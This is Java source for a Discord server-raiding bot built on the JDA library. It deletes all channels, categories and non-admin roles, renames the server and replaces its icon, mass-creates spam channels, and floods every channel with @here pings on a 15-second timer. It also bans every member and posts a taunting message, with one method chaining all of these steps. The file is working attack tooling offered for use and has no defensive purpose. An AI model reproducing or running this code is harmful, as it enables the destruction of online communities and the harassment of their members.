import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;

import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.*;

public class ExploitMethods { //Start
	
	public static void RemoveChannelsAndCategories(Guild g) { // Step-1
		for (Category c : g.getCategories()) {
			c.delete().queue();
		} 
		for (GuildChannel ss : g.getChannels()) {
			ss.delete().queue();
		} 
	}
	
	
	public static void RemoveRoles(Guild g) { // Step-2
		for (Role role : g.getRoles()) {	
			if (role.hasPermission(Permission.ADMINISTRATOR)) {
				//role.getManager().reset().queue();
			} else {
				role.delete().queue();
			}
		}
	}
	
	public static void ChangeNameAndAvatar(Guild g) throws MalformedURLException, IOException { // Step-3
			g.getManager().setName("𝗬𝗪𝟱𝘃𝗯𝗻𝗹𝘁𝗯𝟯𝗩𝘇").queue(); //Put here new name ...	
			g.getManager().setIcon(Icon.from( new URL("https://media.discordapp.net/attachments/1007768699257761793/1007846705661755484/Screenshot_68.png").openStream())).queue(); //Put img link here ...	
	}
	
	
	public static void CreateSpamChannels(Guild g) { // Step-4
		for (GuildChannel s : g.getChannels()) {
			for (int x = 1; x < 15; x++) {				
				g.createTextChannel("𝗬𝗪𝟱𝘃𝗯𝗻𝗹𝘁𝗯𝟯𝗩𝘇").queue();
				s.createCopy().queue();				
				SendSpamMsgToAllChannelsEvery15Second(g);
			}
		}
	}
	
	
	public static void SendSpamMsgToAllChannelsEvery15Second(Guild g) { // Step-5
		for (TextChannel tc : g.getTextChannels()) {
			Timer timer = new Timer();
			int Seconds = 1000;				
			timer.schedule( new TimerTask() {
				public void run() {
					tc.sendMessage(
							"@here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here " + "\n" +
							"@here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here " + "\n" +
							"@here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here @here " + "\n" +
							"Spam Spam Spam Spam"
							).queue();
			    }
			 }, 0, 15*Seconds); //It's 15s ...
		} 
	}
	
	
	
	public static void BanAll(Guild g) { // Step-6
		for (Member m : g.getMembers()) {	
			m.ban(7, "Bye").queue();
		}
		
	}

	
	public static void Leaveamark(Guild g) {
		g.createTextChannel("exist-everywhere").queue(Channel -> { 
			Channel.sendMessage("We are hidden, Nobody can touch us. We are like software. We may appear to be a fantasy or even a legend, but we do exist. || @here ||").queue();
			});
	}
	
	public static void Structured(Guild g) throws MalformedURLException, IOException { // Auto
		RemoveChannelsAndCategories(g);
		Thread(7);
		RemoveRoles(g);
		Thread(14);
		ChangeNameAndAvatar(g);
		Thread(3);
		CreateSpamChannels(g);
		Thread(18);
		SendSpamMsgToAllChannelsEvery15Second(g);
		Thread(3);
		Leaveamark(g);
		Thread(13);
		BanAll(g);
	}
	
	
	public static void Thread(int seconds) {
		try {
			Thread.sleep(seconds*1000);
		} catch (Exception e) {
			
		}
	}
	
	
	
	
	
	
	
	
} //End
